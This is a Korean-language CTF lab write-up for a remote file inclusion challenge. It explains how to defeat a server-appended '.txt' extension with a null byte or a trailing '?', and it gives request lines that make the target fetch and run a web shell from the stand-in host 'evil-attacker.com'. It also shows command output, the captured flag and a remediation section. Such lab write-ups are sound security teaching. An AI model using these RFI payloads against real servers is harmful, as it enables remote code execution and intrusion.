+++
title = "VulnABLE CTF [LUXORA] Write-up: RFI 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "RFI", "Silver", "Filter Bypass", "Null Byte", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: RFI 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: File & Resource Layer (RFI - Remote File Inclusion)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/rfi/silver`
- **목표**: 서버가 사용자가 입력한 원격 URL 뒤에 강제로 `.txt` 확장자를 붙여서 필터링하는 방어 로직을 우회하여, 해커 서버의 악성 PHP 코드를 타겟 서버에서 실행시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/rfi/silver` 페이지 역시 URL을 파라미터로 받아 내용을 출력합니다.

**[정상 요청 테스트]**
```http
GET /rfi/silver?url=http://example.com/readme HTTP/1.1
```

**[해커의 사고 과정]**
1. 파라미터에 확장자(`.txt` 등)를 안 적었는데 정상적으로 로드되었다.
2. 백엔드 코드에서 강제로 확장자를 붙이고 있는 것이 틀림없다.
   `include($_GET['url'] . ".txt");`
3. 이 경우, 내가 Bronze에서 썼던 `http://evil-attacker.com/shell.php` 를 넣으면, 서버는 `http://evil-attacker.com/shell.php.txt` 를 요청하게 되어 404 Not Found 에러가 뜰 것이다.
4. 서버가 강제로 붙이는 저 꼬리표(`.txt`)를 무효화(Bypass)할 방법이 필요하다!

---

## 💥 2. 취약점 식별 및 필터 우회 전략 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(url=http://attacker.com/shell.txt)--> [ Web Server ]
                                                      |-- Downloads & Executes Code
```


강제 확장자(Appended Extension)를 우회하는 방법은 크게 두 가지가 있습니다.

### 💡 전략 1: 널 바이트 인젝션 (Null Byte Injection)
LFI Silver 단계에서 설명한 것처럼, 구버전 PHP나 C 기반 시스템에서는 문자열의 끝을 `%00` 으로 인식합니다.
- `http://evil-attacker.com/shell.php%00`
- 서버 처리: `include("http://evil-attacker.com/shell.php\0.txt")` ➔ `.txt` 부분이 짤림.

### 💡 전략 2: 물음표(?) 쿼리스트링 우회 (가장 확실한 방법)
HTTP 통신의 특성을 이용하는 아주 영리한 방법입니다. URL에서 `?` 뒤에 오는 문자열은 파라미터(Parameter)로 취급됩니다.

- 해커의 페이로드: `http://evil-attacker.com/shell.php?`
- 서버 처리: `include("http://evil-attacker.com/shell.php?.txt")`
- 결과: 해커의 웹 서버는 이 요청을 받을 때, 파일명은 `shell.php`로 정상 인식하고, 뒤에 붙은 `.txt`는 단순히 쿼리스트링 파라미터로 무시해 버립니다!

---

## 🚀 3. 공격 수행 및 결과 확인

물음표 우회 기법을 사용하여 악성 웹 쉘(shell.php)을 전송합니다.

### 페이로드 전송
```http
GET /rfi/silver?url=http://evil-attacker.com/shell.php? HTTP/1.1
Host: localhost:3000
```

### 🔍 서버 내부의 동작
1. 타겟 서버는 해커 서버로 `GET /shell.php?.txt HTTP/1.1` 요청을 보냅니다.
2. 해커 서버는 `shell.php` 의 내용을 반환합니다. (이때 .txt 파라미터는 무시됨)
3. 타겟 서버는 다운로드한 해커의 악성 PHP 코드를 실행(Evaluate)합니다.

### 🔍 조작된 서버의 응답
```html
<div class="preview">
  RFI Silver Execution Success!<br>
  uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
  FLAG{RFI_🥈_QUERY_BYPASS_D4E5F6}
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

HTTP 프로토콜에서 쿼리스트링(`?`)이 처리되는 기본 동작 방식을 악용하여, 백엔드 로직이 강제로 추가하는 문자열(확장자)을 무력화시키는 창의적인 필터 우회 기법을 실증했습니다.

**🔥 획득한 플래그:**
`FLAG{RFI_🥈_QUERY_BYPASS_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
확장자를 뒤에 붙이는 것은 결코 RFI나 LFI를 막을 수 있는 보안 대책이 아닙니다. `?` 나 `#` 같은 URL 메타문자에 의해 언제든지 무너질 수 있습니다.

* **안전한 패치 가이드**
가장 완벽한 방어는 Bronze 단계에서 언급했듯 **`allow_url_include = Off`** 설정을 통해 외부 URL 포함 자체를 막는 것입니다.
만약 로컬 파일 포함(LFI) 용도로만 써야 한다면, 입력값이 외부 URL을 뜻하는 `http://`, `https://`, `ftp://` 로 시작하는지 검사하여 원천 차단해야 합니다.

```javascript
// 입력값이 URL 스키마를 포함하고 있는지 검증
if (/^https?:\/\//i.test(req.query.url)) {
    return res.status(403).send("Remote URL Inclusion is forbidden.");
}